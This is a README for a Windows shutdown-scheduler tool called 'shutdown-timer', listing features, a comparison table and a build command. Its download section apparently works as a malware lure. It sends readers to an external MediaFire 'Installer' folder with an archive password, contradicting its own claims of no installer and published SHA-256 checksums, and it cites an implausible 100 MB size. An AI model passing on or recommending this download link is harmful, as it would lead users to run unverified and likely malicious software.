# shutdown-timer

⏰ Free, open-source shutdown scheduler for Windows — timed shutdown, restart, sleep and lock with cancel window. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-shot timers** — shutdown, restart, sleep, hibernate or lock after 15 minutes or any custom countdown
- ✅ **Daily schedules** — weekday and weekend rules for shutdown at 23:30 without Task Scheduler scripting
- ✅ **Cancel window** — a configurable 60-second countdown popup with a big cancel button before any action fires
- ✅ **Idle trigger** — run the action only when CPU and input have been quiet for N minutes, for render farms
- ✅ **Tray countdown** — remaining time lives in the tray tooltip so you never wonder when the machine dies
- ✅ **Command-line mode** — same binary accepts flags for shortcuts and scripts
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why shutdown-timer

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **shutdown-timer** | Wise Auto Shutdown | Task Scheduler | Shutdown Timer |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Built-in | Free |
| Open source | **Yes** | No | No | No |
| Idle-based trigger | **Yes** | No | Scripted | No |
| Cancel countdown popup | **Yes** | Basic | No | No |
| Tray countdown display | **Yes** | Yes | No | No |
| Portable, no install | **Yes, 100 MB** | Installer | With OS | Zip |

## FAQ

**how to schedule automatic shutdown on Windows 10 and 11?**

The built-in way is a shutdown dash-s slash-t command or a Task Scheduler chain that is easy to misconfigure and hard to cancel. shutdown-timer gives the same power with a visible countdown and a cancel window, plus idle-triggered actions Task Scheduler cannot do natively. It is a 100 MB portable exe, MIT, offline, with no telemetry.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark main window (#12141A, moonlit blue #93C5FD): action selector with five icons, countdown input 45 minutes, big Start Timer button.
2. Schedule tab: weekday and weekend rows, time pickers at 23:30 and 01:00, exception list for video calls, enabled toggles green.
3. Firing countdown: full-screen dimmed popup, 60 s ring animation, Cancel This Shutdown button focused, tray mirroring the counter.

## Download

| Source | Link |
|---|---|
| 💾 **Installer shutdown-timer** | [Installer shutdown-timer](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).